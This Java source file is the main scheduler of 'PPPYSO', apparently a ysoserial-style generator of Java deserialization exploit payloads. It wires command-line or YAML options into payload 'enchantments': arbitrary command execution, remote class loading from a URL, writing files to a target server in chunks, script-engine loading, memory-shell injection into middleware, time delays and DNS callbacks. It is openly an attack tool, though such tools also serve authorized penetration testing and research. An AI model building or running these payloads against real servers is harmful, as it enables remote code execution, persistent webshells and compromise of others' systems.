package com.ppp;

import com.ppp.annotation.*;
import com.ppp.chain.urldns.DNSHelper;
import com.ppp.chain.urldns.Product;
import com.ppp.chain.urldns.Subdomain;
import com.ppp.sinks.SinkScheduler;
import com.ppp.sinks.SinksHelper;
import com.ppp.sinks.annotation.EnchantEnums;
import com.ppp.sinks.annotation.EnchantType;
import com.ppp.utils.RanDomUtils;

import java.io.*;
import java.util.Arrays;
import java.util.List;
import java.util.Map;

/**
 * @author Whoopsunix
 */
public class Scheduler {
    private static String gadgetPackageName = "com.ppp.chain";
    private static String userDir = System.getProperty("user.dir") + "/PPPConfig.yml";

    public static void main(String[] args) throws Exception {
        SinksHelper sinksHelper = new SinksHelper();
        Class cls = null;
        if (args.length == 0) {
            PPPYSOexit();
        } else if (args.length == 1 && !args[0].equalsIgnoreCase("-h") && !args[0].equalsIgnoreCase("-help")) {
            String configPath = args[0];
            if (!new File(configPath).exists() && new File(userDir).exists()) {
                configPath = userDir;
            } else {
                PPPYSOexit();
            }

            cls = YamlScheduler.run(configPath, sinksHelper);
        } else {
            cls = CliScheduler.run(args, sinksHelper);
        }

        // 默认生成
        Object gadget = ObjectPayloadBuilder.builder(cls, sinksHelper);

        if (sinksHelper.isLoop()) {
            // 文件分片
            if (sinksHelper.getFileParts() != null) {
                String fileDir = "result/" + RanDomUtils.generateRandomOnlyString(3);
                // 创建目录
                new File("result").mkdir();
                new File(fileDir).mkdir();
                List<byte[]> fileParts = sinksHelper.getFileParts();
                for (int i = 0; i < fileParts.size(); i++) {
                    sinksHelper.setSave(true);
                    sinksHelper.setFileBytes(fileParts.get(i));
                    sinksHelper.setAppend(true);
                    sinksHelper.setSavePath(String.format("%s/%s.bin", fileDir, i));
                    ObjectPayloadBuilder.builder(cls, sinksHelper);
                }
            }
        }


    }

    public static void PPPYSOexit() throws Exception {
        PPPYSO();
        if (!new File(userDir).exists()) {
            generateDefaultConfigYaml();
        }
        SinkScheduler.showGadget();
        System.exit(0);
    }

    public static void PPPYSO() {
        String banner = " __ ___ ___ __  __ __  _  \n" +
                "| o \\ o \\ o \\\\ V // _|/ \\ \n" +
                "|  _/  _/  _/ \\ / \\_ ( o )\n" +
                "|_| |_| |_|   |_| |__/\\_/ \n" +
                "    1.1.0   By. Whoopsunix \n";
        Printer.print(banner);
    }

    public static void generateDefaultConfigYaml() throws Exception {
        InputStream resourceAsStream = Thread.currentThread().getContextClassLoader().getResourceAsStream("PPPConfig.yml");
        BufferedReader reader = new BufferedReader(new InputStreamReader(resourceAsStream));

        // 写入文件
        FileWriter fileWriter = new FileWriter(userDir);
        String line;
        while ((line = reader.readLine()) != null) {
            fileWriter.write(line + "\n");
        }
        // 关闭 FileWriter 和 BufferedReader
        fileWriter.close();
        reader.close();
        resourceAsStream.close();
        Printer.warn("Config file not found, Generate a default configuration file PPPConfig.yml in the current directory");
    }

    public static void closePrint() {
        System.setProperty(Printer.PRINT_ENABLED_PROPERTY, String.valueOf(false));
    }

    /**
     * 命令执行增强
     */
    public static void enchantCommand(SinksHelper sinksHelper, Map sinksHelperMap) {
        sinksHelper.setEnchant(EnchantType.Command);
        String command = (String) sinksHelperMap.get(CliOptions.Command.getLongOpt());
        String commandType = (String) sinksHelperMap.get(CliOptions.CommandType.getLongOpt());
        Boolean split = (Boolean) sinksHelperMap.get(CliOptions.Split.getLongOpt());
        String code = (String) sinksHelperMap.get(CliOptions.Code.getLongOpt());
        String codeFile = (String) sinksHelperMap.get(CliOptions.CodeFile.getLongOpt());
        if (command == null && code == null && codeFile == null) {
            Printer.error("Command is null");
        }
        sinksHelper.setCommand(command);
        if (commandType != null) {
            sinksHelper.setCommandType(EnchantEnums.getEnchantEnums(commandType));
        } else {
            sinksHelper.setCommandType(EnchantEnums.Runtime);
            Printer.log("Use default command type: Runtime");
        }
        if (split != null) {
            sinksHelper.setSplit(split);
        }
        if (code != null) {
            sinksHelper.setCode(code);
        }
        if (codeFile != null) {
            sinksHelper.setCodeFile(codeFile);
        }
    }

    /**
     * 延时增强
     */
    public static void enchantDelay(SinksHelper sinksHelper, Map sinksHelperMap) {
        sinksHelper.setEnchant(EnchantType.Delay);
        Long delayTime = Long.parseLong((String) sinksHelperMap.get(CliOptions.DelayTime.getLongOpt()));
        if (delayTime == null) {
            Printer.error("Delay time is null");
        }
        sinksHelper.setDelayTime(delayTime);

    }

    /**
     * Socket 增强
     */
    public static void enchantSocket(SinksHelper sinksHelper, Map sinksHelperMap) {
        sinksHelper.setEnchant(EnchantType.Socket);
        String host = (String) sinksHelperMap.get(CliOptions.Host.getLongOpt());
        if (host == null) {
            Printer.error("Host is null");
        }
        sinksHelper.setHost(host);
    }

    /**
     * 远程类加载
     */
    public static void enchantRemoteLoad(SinksHelper sinksHelper, Map sinksHelperMap) {
        sinksHelper.setEnchant(EnchantType.RemoteLoad);
        String url = (String) sinksHelperMap.get(CliOptions.URL.getLongOpt());
        String className = (String) sinksHelperMap.get(CliOptions.ClassName.getLongOpt());
        Object constructor = sinksHelperMap.get(CliOptions.Constructor.getLongOpt());

        if (url == null) {
            Printer.error("URL is null");
        }
        sinksHelper.setUrl(url);
        if (className == null) {
            Printer.error("Class name is null");
        }
        sinksHelper.setClassName(className);
        sinksHelper.setConstructor(constructor);

    }

    /**
     * 文件写入增强
     */
    public static void enchantFileWrite(SinksHelper sinksHelper, Map sinksHelperMap) {
        sinksHelper.setEnchant(EnchantType.FileWrite);
        String serverFilePath = (String) sinksHelperMap.get(CliOptions.ServerFilePath.getLongOpt());
        String localFilePath = (String) sinksHelperMap.get(CliOptions.LocalFilePath.getLongOpt());
        String fileContent = (String) sinksHelperMap.get(CliOptions.FileContent.getLongOpt());
        Boolean append = (Boolean) sinksHelperMap.get(CliOptions.Append.getLongOpt());
        Boolean split = (Boolean) sinksHelperMap.get(CliOptions.Split.getLongOpt());
        Object partSize = sinksHelperMap.get(CliOptions.PartSize.getLongOpt());

        if (serverFilePath == null) {
            Printer.error("Server file path is null");
        }
        sinksHelper.setServerFilePath(serverFilePath);
        if (localFilePath != null) {
            sinksHelper.setLocalFilePath(localFilePath);
        } else if (fileContent != null) {
            sinksHelper.setFileContent(fileContent);
        } else {
            Printer.error("Please set local file path or file content");
        }
        if (append != null) {
            sinksHelper.setAppend(append);
        }
        if (split != null) {
            sinksHelper.setSplit(split);
        }
        if (partSize != null) {
            sinksHelper.setPartSize(Integer.parseInt((String) partSize));
        }
    }

    /**
     * 本地加载增强
     */
    public static void enchantLocalLoad(SinksHelper sinksHelper, Map sinksHelperMap) {
        sinksHelper.setEnchant(EnchantType.LocalLoad);
        String loadFunction = (String) sinksHelperMap.get(CliOptions.LoadFunction.getLongOpt());
        if (loadFunction != null) {
            sinksHelper.setLoadFunction(EnchantEnums.getEnchantEnums(loadFunction));
        } else {
            sinksHelper.setLoadFunction(EnchantEnums.ScriptEngine);
            Printer.log("Use default load function: ScriptEngine");
        }
    }

    /**
     * JavaClass 增强
     *
     * @param sinksHelper
     * @param javaClassHelperMap
     */
    public static void enchantJavaClass(SinksHelper sinksHelper, Map javaClassHelperMap) {
        sinksHelper.setEnchant(EnchantType.JavaClass);

        JavaClassHelper javaClassHelper = sinksHelper.getJavaClassHelper();
        String javaClassHelperType = JavaClassHelperType.Utils.getJavaClassHelperType((String) javaClassHelperMap.get("javaClassHelperType"));
        javaClassHelper.setJavaClassHelperType(javaClassHelperType);
        javaClassHelper.setJavaClassType(JavaClassType.Utils.getJavaClassType((String) javaClassHelperMap.get("javaClassType")));
        javaClassHelper.setMiddleware(Middleware.Utils.getMiddleware((String) javaClassHelperMap.get("middleware")));
        if (javaClassHelperType.equalsIgnoreCase(JavaClassHelperType.MemShell)) {
            javaClassHelper.setMemShell(MemShell.Utils.getMemShell((String) javaClassHelperMap.get("memShell")));
            javaClassHelper.setMemShellFunction(MemShellFunction.Utils.getMemShellFunction((String) javaClassHelperMap.get("memShellFunction")));
        }

    }

    /**
     * URLDNS 增强
     */
    public static void enchantURLDNS(SinksHelper sinksHelper, Map sinksHelperMap) {
        DNSHelper dnsHelper = new DNSHelper();

        String host = (String) sinksHelperMap.get(CliOptions.Host.getLongOpt());
        if (host == null) {
            Printer.error("Host is null");
        }
        dnsHelper.setHost(host);
        String className = (String) sinksHelperMap.get(CliOptions.ClassName.getLongOpt());
        dnsHelper.setClassName(className);
        String subdomain = (String) sinksHelperMap.get(CliOptions.DNSSubdomain.getLongOpt());
        dnsHelper.setSubdomain(subdomain);

        String products = (String) sinksHelperMap.get(CliOptions.DNSProducts.getLongOpt());
        if (products != null) {
            if (products.equalsIgnoreCase("all")) {
                dnsHelper.setProducts(Product.values());
            } else if (products.equalsIgnoreCase("show")) {
                Product.show();
                Subdomain.show();
            } else {
                String[] productArray = products.split(",");
                Product[] productList = new Product[productArray.length];
                for (int i = 0; i < productArray.length; i++) {
                    productList[i] = Product.getProduct(productArray[i]);
                }
                dnsHelper.setProducts(productList);
            }
        }

        sinksHelper.setDnsHelper(dnsHelper);
    }


}
